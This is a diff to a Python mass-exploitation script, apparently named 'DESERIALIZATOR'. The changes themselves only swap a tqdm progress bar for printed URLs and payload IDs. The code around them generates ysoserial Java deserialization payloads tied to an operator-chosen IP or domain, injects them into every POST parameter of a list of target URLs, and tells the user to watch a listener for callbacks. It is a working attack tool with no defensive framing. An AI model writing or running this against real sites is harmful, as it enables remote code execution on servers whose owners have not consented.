@@ -18,7 +18,6 @@
 ###
 
 import sys, time, getopt, urlparse, requests, base64, os, ssl
-from tqdm import tqdm
 from datetime import datetime
 from urllib3.exceptions import InsecureRequestWarning
 from IPy import IP
@@ -92,12 +91,14 @@ def send_payload(URL,payload,data_to_post, headers, cookies):
         old_data = dict(data_to_post)
         data_to_post.update({data_to_post.keys()[0]:payload})
         r = s.post(url=URL, data=data_to_post)
+        print(r.url)
         data_to_post = dict(old_data)
     else:
         for key in data_to_post:
             old_data = dict(data_to_post)
             data_to_post.update({key:payload})
             r = s.post(url=URL, data=data_to_post, headers=headers)
+            print(r.url)
             data_to_post = dict(old_data)
 
 
@@ -124,15 +125,17 @@ for current_argument, current_value in arguments:
 try:
     if cookies:
         cookies = import_cookies(cookies)
-    print("\033[0;31m[+]\033[0m STARTING DESERIALIZATOR - URLS TO TEST: " + str(len(list_of_urls)))
-    print("\033[0;31m[+][+]\033[0m CHECK FOR PINGs ON YOUR LISTENER")
+    print("\033[0;31m[+]\033[0m STARTING DESERIALIZATOR - URLS TO TEST: " + str(len(open(list_of_urls).readlines())))
     with open(list_of_urls) as urls:
         payload_id = 1
-        for url in tqdm(urls):
+        for url in urls:
             new_url, data_to_post = change_get_to_post(url.rstrip())
             payload = generate_ysoserial(payload_id, ip_or_domain)
+            print("ID: " + str(payload_id) + " - URLs: ")
             send_payload(new_url, payload, data_to_post, headers, cookies)
             payload_id += 1
+    print("\033[0;31m[+][+]\033[0m CHECK FOR PINGs ON YOUR LISTENER")
+
 except:
     print("""\033[0;31m
 ██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗ ██████╗ ██████╗ 
